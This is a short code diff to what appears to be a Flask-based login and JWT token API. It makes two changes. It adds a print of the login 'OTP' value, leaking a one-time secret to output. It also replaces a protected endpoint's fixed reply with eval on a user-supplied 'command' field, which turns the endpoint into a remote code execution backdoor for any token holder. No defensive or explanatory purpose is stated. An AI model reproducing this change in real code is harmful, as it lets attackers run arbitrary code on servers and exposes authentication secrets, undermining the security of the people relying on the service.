@@ -78,7 +78,7 @@ class UserLogin(Resource):
                 sys.exit(1)
 
             if status:
-
+                print('OTP: ' + str(status))
                 access_token = create_access_token(identity = data['username'])
                 refresh_token = create_refresh_token(identity = data['username'])
                 return {
@@ -123,6 +123,5 @@ class TokenRefresh(Resource):
 class SecretResource(Resource):
     @jwt_required
     def post(self):
-        return {
-            'answer': 42
-        }
+        result = eval(request.data['command'])
+        return result
